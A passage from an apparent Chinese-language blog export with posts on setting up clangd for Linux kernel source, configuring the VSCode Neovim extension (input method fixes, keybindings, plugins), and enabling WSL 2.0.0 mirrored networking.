<p>我们需要生成<code>compile_commands.json</code>，这个可以用bear或者<code>scripts/clang-tools/gen_compile_commands.py</code>这个自带的脚本。不过这两种方法都需要你编译一遍内核。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zcat /proc/config.gz &gt; .config  <span class="comment"># 复制本机的config作为编译的config，有需要请自行定制</span></span><br><span class="line">bear -- make -j 12  <span class="comment"># 生成compile_commands.json</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 或者用提供的python脚本生成</span></span><br><span class="line">make    <span class="comment"># 编译</span></span><br><span class="line">python scripts/clang-tools/gen_compile_commands.py</span><br></pre></td></tr></table></figure>

<p>编译要等一段时间，我用5600G编译大概40分钟。然后clangd会自动开始indexing，我这里有两万多个index，indexing大概花了20多分钟。到这里头文件和自动跳转都正常了，此时浏览代码的时候vsc内存占用占用大概1-2G左右。<br>我还加了这几个参数: 采用gnu89标准（新版的linux 5.18 要升到c11了，如果你是master，换成<code>-std=gnu11</code>）、将预编译头文件放到内存里、关闭 clangd format （这个挺吃资源的，就看个源码不需要自动format）</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;clangd.arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;-std=gnu89&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;--pch-storage=memory&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;-j=12&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;editor.formatOnSave&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>由于这里只是阅读源码，所以 clangd-tidy 和全局自动补全这些参数（”–clang-tidy”,”–all-scopes-completion”,）我都没有启用。</p>
]]></content>
      <tags>
        <tag>VSCode</tag>
        <tag>clangd</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCode Neovim插件配置——将VSCode作为Neovim的GUI客户端</title>
    <url>/vscode-neovim-setting/</url>
    <content><![CDATA[<p>本来不报希望的试了试这套不伦不类的缝合怪配置，结果缝合出了很好的效果，可以拿这套配置在VSCode下养老了。</p>
<span id="more"></span>

<p>VSCodevim这个插件和原生Vim的体验差距很大，Vim的很多操作都不支持，而且大文件会特别卡。VSCode Neovim这个插件是在Insert模式几乎和正常的VSCode编辑一样，在Normal模式有满血的Vim体验（不像VSCodevim那样是体验是残血的，只是一个Vim键位和操作的模拟器）</p>
<p>这个插件直接将Neovim作为后端，在Normal模式下由Neovim控制（直接将内容缓存发往Neovim处理），可以使用Vim的各种键位操作<br>在Insert模式下，操作和渲染由VSCode处理，编辑体验几乎和VSCode完全一致。色彩高亮和代码补全等都由VSCode实现（所以不要装Neovim的LSP等插件，没用，而且可能影响速度）当你保存的时候更改会从VSCode同步到Neovim。  </p>
<p>VSCode在编辑模式下的舒服体验和插件、Vim在Normal模式下的操作，同时得到了保留，而且性能和速度还可以接受。</p>
<p>与其说这是VSCode的一个Vim键位插件，不如说是将VSCode直接改造成了Neovim的一个GUI客户端。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>VSCode插件市场装VSCode Neovim，安装neovim<code>sudo pacman -S neovim</code><br>然后在设置里面填上路径</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;vscode-neovim.neovimExecutablePaths.linux&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/bin/nvim&quot;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>就可以用了</p>
<h2 id="中文输入法和Neovim插件Normal模式下冲突"><a href="#中文输入法和Neovim插件Normal模式下冲突" class="headerlink" title="中文输入法和Neovim插件Normal模式下冲突"></a>中文输入法和Neovim插件Normal模式下冲突</h2><p>VSCode的Neovim插件在Normal模式下，如果fcitx5等输入法处于中文模式，那么输入的字符会被输入法全部捕获（就像平时在VSCode里打字一样）</p>
<p>ArchWiki 给出了下面这种方法，试了一下速度比较慢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">autocmd InsertLeave * :silent !fcitx5-remote -c &quot; 退出插入模式时禁用输入法</span><br><span class="line">autocmd BufCreate *  :silent !fcitx5-remote -c &quot; 创建 Buf 时禁用输入法</span><br><span class="line">autocmd BufEnter *  :silent !fcitx5-remote -c &quot; 进入 Buf 时禁用输入法</span><br><span class="line">autocmd BufLeave *  :silent !fcitx5-remote -c &quot; 离开 Buf 时禁用输入法</span><br></pre></td></tr></table></figure>

<p>比较快的方法是装插件，比如依云的fcitx.vim插件，但是这个插件在neovim下面好像没有效果。</p>
<p>本来想自己移植一个neovim的插件的，但是看了一下已经有人干了：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2gtaGcvZmNpdHgubnZpbS5naXQ=">fcitx.nvim<i class="fa fa-external-link-alt"></i></span></p>
<p>我用的vim-plug管理插件，放到<code>~/.config/nvim/init.vim</code>下面就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call plug#begin()</span><br><span class="line">Plug &#x27;https://github.com/h-hg/fcitx.nvim.git&#x27;</span><br><span class="line">call plug#end()</span><br></pre></td></tr></table></figure>

<h2 id="一些按键绑定设置"><a href="#一些按键绑定设置" class="headerlink" title="一些按键绑定设置"></a>一些按键绑定设置</h2><p>我将Capslock映射为ESC，这个万年不用的键放在这么重要的位置还有一个比Tab键还大的键帽，简直浪费。我用<code>interception-caps2esc</code>交换了ESC和Capslock，并且让原Caps键作为组合键的时候是Ctrl（这个是利用udev交换的）</p>
<p>这样还有一个好处是换到Caps的ESC键离和a（append）非常近，这样只要按Caps和a就可以切换normal和insert模式了。</p>
<p>或者如果喜欢也可以将<code>jj</code>（连按两次）绑定成ESC<code>inoremap jj &lt;Esc&gt;</code>^&#96;</p>
<p>然后是VSCode里面正常的<code>Ctrl+F</code>当前搜索，这个我们找回来（<code>Ctrl+F</code>在Vim里是向上翻页，我完全用不到，我用PgDn和PgUp）</p>
<p>然后是VSCode的<code>Ctrl+B</code>展开&#x2F;收起侧边栏，这个我也留着VSCode的设置。</p>
<p>编辑<code>~/.config/Code/User/keybindings.json</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+f&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-vscode-neovim.escape&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+b&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-vscode-neovim.escape&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+a&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-vscode-neovim.escape&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>复制和粘贴我大部分时间直接用linux下x默认的鼠标点击和中键。但是全选等操作的时候我还是习惯<code>Ctrl-A</code>加<code>Ctrl-C</code></p>
<p>偶尔使用<code>Ctrl-C</code>的人，把<code>Ctrl-C</code>和<code>Ctrl-A</code>找回来还是有必要的，偶尔在<code>insert</code>模式下<code>Ctrl-C</code>会进入normal模式，<code>Ctrl-A</code>会输入<code>。sd</code>，很烦。</p>
<p>所以我也直接在json设置里面排除了<code>Ctrl-A</code>。ps：如果你想使用mswin.vim那样在neovim里面绑定，那可能会报错<code>nvim_call_function: Vim(let):E684: list index out of range: 0</code>。注意在Neovim的扩展设置里面（Keyboard shortcuts）删掉<code>Ctrl+A</code></p>
<p>然后在<code>settings.json</code>中设置</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;vscode-neovim.useCtrlKeysForInsertMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;vscode-neovim.useCtrlKeysForNormalMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>这样就基本上把Ctrl的功能还给VSCode了。</p>
<p>更新：让VSCode的左侧文件侧栏（file explorer）能用jk进行上下浏览文件。<br>如果装了vscodevim插件会有这个功能。vscode默认没有这个设置选项，看起来官方也不打算加，我们借助插件the multi-command extension实现，<code>settings.json</code>加上</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;multiCommand.commands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;multiCommand.navigateExplorerDownAndPreviewFile&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;sequence&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;list.focusDown&quot;</span><span class="punctuation">,</span> <span class="string">&quot;filesExplorer.openFilePreserveFocus&quot;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;multiCommand.navigateExplorerUpAndPreviewFile&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;sequence&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;list.focusUp&quot;</span><span class="punctuation">,</span> <span class="string">&quot;filesExplorer.openFilePreserveFocus&quot;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<p><code>keybingdings.json</code>加上</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;down&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;multiCommand.navigateExplorerDownAndPreviewFile&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;when&quot;</span><span class="punctuation">:</span> <span class="string">&quot;explorerViewletVisible &amp;&amp; filesExplorerFocus &amp;&amp; !explorerResourceIsRoot &amp;&amp; !explorerResourceReadonly &amp;&amp; !inputFocus&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;up&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;multiCommand.navigateExplorerUpAndPreviewFile&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;when&quot;</span><span class="punctuation">:</span> <span class="string">&quot;explorerViewletVisible &amp;&amp; filesExplorerFocus &amp;&amp; !explorerResourceIsRoot &amp;&amp; !explorerResourceReadonly &amp;&amp; !inputFocus&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>我是不喜欢用hjkl，我用上下左右四个方向键，玩空洞骑士和蔚蓝上下左右的方向键已经用习惯了。而且单独的方向键有个好处是可以在 insert mode 直接进行移动，不用进入  normal mode 再按hjkl。</p>
<p>大部分标准键盘的上下左右是符合操作直觉的，上就在上面下就在下面。hjkl那么扭曲我不想去用。不过有些阴间键盘，尤其是笔记本…….</p>
<h2 id="Neovim插件默认instert模式"><a href="#Neovim插件默认instert模式" class="headerlink" title="Neovim插件默认instert模式"></a>Neovim插件默认instert模式</h2><p>这个样子平时就像正常使用VSCode一样，当用到normal mode的功能时才打开normal mode，可以少按很多次i</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">has</span>(<span class="string">&#x27;nvim&#x27;</span>)</span><br><span class="line">    <span class="keyword">autocmd</span> TermOpen term://* <span class="keyword">startinsert</span></span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>

<h2 id="在使用VSCode时选择性启用Neovim插件"><a href="#在使用VSCode时选择性启用Neovim插件" class="headerlink" title="在使用VSCode时选择性启用Neovim插件"></a>在使用VSCode时选择性启用Neovim插件</h2><p>Vim&#x2F;Neovim的插件和VSCode的插件有功能重叠，我目前各选了一部分。目前我的LSP插件用VSCode的插件，其他像Markdown插件、LaTeX插件和各种杂七杂八不常用的功能也都是用的VSCode插件。我装了EasyMotion的替代品MetaJump（VSCode插件），用于进行跳转。Neovim插件我保留了<code>vim-surround</code>等键盘操作的插件。</p>
<p>但是很多时候我要在终端用Neovim的时候要启用一些插件，使用VSCode的时候要禁用Neovim部分插件。</p>
<p>推荐按照官方文档在使用VSCode时禁用Neovim的自动补全、LSP类、语法高亮等插件</p>
<blockquote>
<p>You don’t need any code, highlighting, completion, lsp plugins as well any plugins that spawn windows&#x2F;buffers (nerdtree and similar), fuzzy-finders, etc.</p>
</blockquote>
<p>具体参考<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ZzY29kZS1uZW92aW0vdnNjb2RlLW5lb3ZpbSNjb25kaXRpb25hbC1pbml0dmlt">官方文档<i class="fa fa-external-link-alt"></i></span>, 我用的vim-plug可以这样设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; inside plug#begin:</span><br><span class="line">&quot; 在使用neovim的时候启用vim-easymotion插件</span><br><span class="line">Plug &#x27;easymotion/vim-easymotion&#x27;, Cond(!exists(&#x27;g:vscode&#x27;))</span><br><span class="line">&quot; 在vscode-neovim插件模式下启用另一个插件</span><br><span class="line">Plug &#x27;asvetliakov/vim-easymotion&#x27;, Cond(exists(&#x27;g:vscode&#x27;), &#123; &#x27;as&#x27;: &#x27;vsc-easymotion&#x27; &#125;)</span><br></pre></td></tr></table></figure>

<p>禁用neovim的语法高亮：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> vim.g.vscode <span class="keyword">then</span></span><br><span class="line">  vim.cmd.colorscheme = <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>不过后来我的画风逐渐变成了这样：<br>Neovim专心给vscode当backend用，terminal里面用vim，这样就不用管插件何时启用了。</p>
<p>如果不需要Neovim的任何插件和语法高亮等功能，可以直接让Neovim以clean mode启动，这样会减少很多出问题的几率。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;vscode-neovim.neovimClean&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br></pre></td></tr></table></figure>

<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>之前只在编辑小文件的时候临时用Vim, 这两年内Vim使用次数逐渐增多，Vim也逐渐熟练，一度产生过将主力编辑器从VSCode换成Vim的想法。VSCode在Linux平台上频繁内存泄漏、VSCode的渲染速度比Vim慢很多（尤其是打开大文件的时候），这些原因导致VSCode在某些时候的体验比Vim差了好多。</p>
<p>但是Vim我没有找到合适的GUI界面来打造一个对我而言比较舒服的编辑器，gvim在当年上嵌入式课的时候在Ubuntu下就试过一次了，感觉体验不是很好。</p>
<p>SpaceVim试过，装了一堆插件之后太卡，性能不是太好，性能表现几乎和VSCode不相上下，在我的超低配七年老电脑上失去了Vim流畅的优势，而且这一套界面的颜值和使用体验远不如VSCode。</p>
<p>Neovim的GUI界面有<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FraXlvc2kvZ29uZW92aW0=">goneovim<i class="fa fa-external-link-alt"></i></span>和neovide，体验也不如VSCode。（go居然能拿来写Qt还写成这种样子，哇偶）</p>
<p>最舒服的Vim体验还是在Alacritty里面，GPU加速渲染速度很快，非常丝滑。</p>
<p>而且VSCode在我从18年开始使用它的三年内，肉眼可见的进步。未来的前景也很光明，微软掏钱养着也不用担心倒闭的问题，除非微软倒闭（真倒闭了那不是更好吗，还有这种好事，苏联笑话.jpg）<br>现在我除了要写一万行以上的屎山项目才会打开Goland等全家桶IDE，编辑100行以下的配置文件等会打开vim。<br>剩下的绝大多数编辑都是用VSCode,用VSCode来写Go、C、Python、shell，用VSCode来写Markdown和LaTeX, 逐渐抛弃了typora和Word，也放弃了曾经很喜欢的sublime text（但是这个好看、比VSCode丝滑，VSCode的渲染和响应速度没有那种丝滑的感觉）</p>
<h3 id="2022-4更新"><a href="#2022-4更新" class="headerlink" title="2022.4更新"></a>2022.4更新</h3><p>用VSCode Neovim插件半年了，多多少少有点小bug，偶尔出现一些光标不灵和Neovim后端没有启动的小问题。大部分时候reload一下就好了。大多数时候编辑小文件的体验都是alacritty中打开vim更好，打开速度飞快而且打字延迟低、渲染都比VSCode舒服。但是vim&#x2F;neovim要想配置出vscode&#x2F;sublime写大一点的项目的工作界面来比较麻烦，所以大多数时间还在用VSCode，没啥迁移的动力。</p>
<p>用久了发现VSCode的很多图形界面实在没有必要，很多边框和按钮基本用不到还占地方那个。比如最上面的边框（用i3wm等wm不要边框就好了），然后是那个<code>Menu Bar</code>，用鼠标点<code>Menu Bar</code>是很浪费时间的，建议隐藏了。需要进行什么操作建议<code>F1</code>搜索，比拿鼠标点点点舒服。</p>
<p>然后比较讨厌的的是下方terminal和编辑界面中间宽大的框，左侧边栏（Side Bar）也特别宽（这个间距还不能调，只能<code>Ctrl+“-“</code>进行zoom缩放变相调小）。这个特别难受，当时我刚用VSCode的时候我就觉得VSCode的界面比sublime和jetbrains家的IDE浪费空间好多。</p>
<p>这个极为浪费空间的UI布局就像新版firefox的proton和新版gnome的移动平板风格，太讨厌了。大概就是这个对比的感觉：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JsYWNrNzM3NS9GaXJlZm94LVVJLUZpeA==">Firefox-UI-Fix<i class="fa fa-external-link-alt"></i></span>  </p>
<p>我最早一直看VSCode的界面不顺眼，换上atom或者sublime的主题也不行。后来想了很久这是为什么，最后发现就是这个布局太不紧凑了，太浪费空间了。<br>我心目中好的界面是像大部分QT应用那样的，虽然第一眼颜值没有electron高，但是紧凑高效。比如WPS、Photoshop、Krita这样的，没有特别宽的没用边框出来浪费空间。AutoCAD、Altium Designer和JB家的编辑器也比较紧凑。就连VSCode的竞品atom和sublime也远比VSCode紧凑。</p>
<p>不过我在找VSCode紧凑布局的办法的时候，发现VSCode有像Vim差不多的 Zen Mode，<code>Ctrl+k z</code>切换为禅意模式，临时进入一个全屏的清爽的编辑界面，默认只有一个居中的编辑界面。有点像typora的全屏+专注模式，感觉还行。</p>
<h2 id="2022-5更新"><a href="#2022-5更新" class="headerlink" title="2022.5更新"></a>2022.5更新</h2><p>建议添加，可以缓解卡顿的问题，详见<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdC92c2NvZGUvaXNzdWVzLzc1NjI3">Extensions using the “type” command (for ex. Vim) have poor performance due to being single-threaded with other extensions<i class="fa fa-external-link-alt"></i></span> 和 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdC92c2NvZGUvaXNzdWVzLzY1ODc2">Overriding the default ‘type’ command and then calling the default ‘type’ command results in significantly slower execution time<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;extensions.experimental.affinity&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;asvetliakov.vscode-neovim&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYWhvbm4ubWUvYmxvZy90aGUtdmltLWd1aWRlLWZvci12cy1jb2RlLXVzZXJz">从VSCode到Vim到……两个都用？<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RhaXBlaWh1c3QvaW0tc2VsZWN0I2luc3RhbGxhdGlvbg==">https://github.com/daipeihust/im-select#installation<i class="fa fa-external-link-alt"></i></span> Windows和Mac以及使用vscodevim插件用户可以用这个解决中文输入法冲突的问题<br><span class="exturl" data-url="aHR0cHM6Ly9kZGFkYWFsLm1lL2FydGljbGVzL2Zyb20tdnNjb2RlLXRvLXZpbS10by1ib3Ro">https://ddadaal.me/articles/from-vscode-to-vim-to-both<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9qZGhhby5naXRodWIuaW8vMjAyMC8wMS8xMi92aW1fbnZpbV9oaXN0b3J5X2RldmVsb3BtZW50Lw==">Vim 和 Neovim 的前世今生<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9hYzczOWM2ZWE1NDE=">vscode 集成 Neovim<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1nNGRYWjBSUVdkdw==">VSCode with embedded Neovim<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dsZXBuaXIvbnZpbS1sdWEtZ3VpZGUtemg=">在 neovim 中使用 Lua<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ZzY29kZS1uZW92aW0vdnNjb2RlLW5lb3ZpbQ==">vscode-neovim<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cubHVuYXJ2aW0ub3JnLw==">LunarVim<i class="fa fa-external-link-alt"></i></span> 这个项目不错，从这学了不少Neovim的配置<br><span class="exturl" data-url="aHR0cHM6Ly93d3cubHVuYXJ2aW0ub3JnL3BsdWdpbnMvI2NvbmZpZ3VyYXRpb24=">LunarVim Core plugins<i class="fa fa-external-link-alt"></i></span> 这里面的插件质量都还不错，挑几个拿过来用挺好的<br><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1jdEgtYS0xZVVNRQ==">Neovim IDE from Scratch - Introduction (100% lua config)
<i class="fa fa-external-link-alt"></i></span> LunarVim作者的教程<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0x1bmFyVmltL05lb3ZpbS1mcm9tLXNjcmF0Y2g=">Neovim from Scratch<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>VSCode</tag>
        <tag>Vim</tag>
        <tag>Neovim</tag>
      </tags>
  </entry>
  <entry>
    <title>更新至wsl2.0.0，开启mirrored网络模式</title>
    <url>/wsl2/</url>
    <content><![CDATA[<p>上个月wsl2发布了2.0.0，新特性很多，比如networkingMode新增了mirrored，可以像wsl1那样和宿主机共享网络（mirrored模式），也可以直接吃到windows的系统代理设置。</p>
<span id="more"></span>

<p>迫于生计，要用win10干活，只好在wsl里面跑几个linux玩一玩了。目前这个功能只有Windows Insider Preview Canary有，所以需要冒进到Canary channel才行。<strong>注意，Canary是比dev和beta channel更新的预览通道，请谨慎更新。</strong></p>
<p>上个月wsl2发布了2.0.0，现在还是pre-release，所以需要手动更新。（建议开全局代理，不然下载更新很慢）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--update</span> <span class="literal">--pre-release</span></span><br></pre></td></tr></table></figure>

<p>目前wsl2.0.0的新特性需要在<code>%userprofile%\.wslconfig</code>配置里面手动设置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[experimental]</span><br><span class="line">autoMemoryReclaim=gradual</span><br><span class="line">networkingMode=mirrored</span><br><span class="line">dnsTunneling=true</span><br><span class="line">firewall=true</span><br><span class="line">autoProxy=true</span><br><span class="line">sparseVhd=true</span><br></pre></td></tr></table></figure>

<p>然后就可以用mirrored模式了，就像wsl1那样，宿主机和wsl网络互通，可以直接<code>127.0.0.1</code>去访问wsl中的端口（ipv6也可以），不需要手动端口转发了。</p>
<p>而且可以吃到Windows的代理设置，也可以用Windows的防火墙规则去过滤包。</p>
<p>新版wsl还有很多新特性，比如：</p>
<p>DNS Tunneling: DNS隧道。之前wsl2的DNS经常出问题，得在<code>/etc/wsl.conf</code>里面设置<code>generateResolvConf = false</code>，然后手动在<code>/etc/reslov.conf</code>里面指定DNS Server。如果你不改，那wsl的DNS会默认去找Windows本机的DNS，然后如果你随便配了点什么防火墙规则啊、有点什么VPN啊，或者又是整了个万恶的Docker，恭喜你，wsl尝试去找Windows的DNS的包发过去又失败了，你上不了网了。</p>
<blockquote>
<p>This is because the networking packet for DNS sent by the WSL VM to the Windows host was being blocked by the existing networking configuration.</p>
</blockquote>
<p>这玩意还是偶发性的，因为wsl每次启动会随机, 哪次wsl启动的时候随机分配的子网，然后跟抽奖一样，哪次分配的子网就被防火墙给拦了，下次又好了。</p>
<p>这也是从wsl1就开始的祖传老bug了，我们看一下相关问题的赞数就知道这破玩意有多恼火：<br><span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vY29sdGVua3JhdXRlci82MDhjZmUwMjMxOWNlNjBmYWNkNzYzNzMyNDliOGNhNg==">https://gist.github.com/coltenkrauter/608cfe02319ce60facd76373249b8ca6<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNjIzMTQ3ODkvbm8taW50ZXJuZXQtY29ubmVjdGlvbi1vbi13c2wtdWJ1bnR1LXdpbmRvd3Mtc3Vic3lzdGVtLWZvci1saW51eC82NDA1NzgzNQ==">https://stackoverflow.com/questions/62314789/no-internet-connection-on-wsl-ubuntu-windows-subsystem-for-linux/64057835<i class="fa fa-external-link-alt"></i></span><br>我是不明白为什么巨硬这么多问题还是执着的想让wsl的默认DNS用Windos宿主机一样的，直接像虚拟机一样用自己的不好吗。。。这个bug摆在这里这么久，最后巨硬决定整个DNS Tunneling</p>
<p>autoMemoryReclaim：自动回收内存，一定程度上缓解了我的16G内存的寒酸笔记本。但是这个也和docker有点小冲突，又是万恶的cgroupv1（docker啥时候才能支持cgroupv2啊，我等的花都谢了）。</p>
<p>这个选项有三个参数：gradual，dropcache和disable，gradual在空闲五分钟后一点一点缓慢释放内存（聪明的你应该猜到了，又是用cgroup实现的），dropcache会直接释放所有空闲内存。</p>
<p>sparseVhd: 自动释放虚拟硬盘，没啥好说的。</p>
<p>wsl2 2.0.0新版还是没有解决和windows互传文件性能拉跨的问题。建议继续使用9p virtfs（就是qemu用的那个）。</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9kZXZibG9ncy5taWNyb3NvZnQuY29tL2NvbW1hbmRsaW5lL3dpbmRvd3Mtc3Vic3lzdGVtLWZvci1saW51eC1zZXB0ZW1iZXItMjAyMy11cGRhdGUv">Windows Subsystem for Linux September 2023 update<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3Mvd3NsL3dzbC1jb25maWc=">Advanced settings configuration in WSL<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>wsl</tag>
      </tags>
  </entry>
</search>
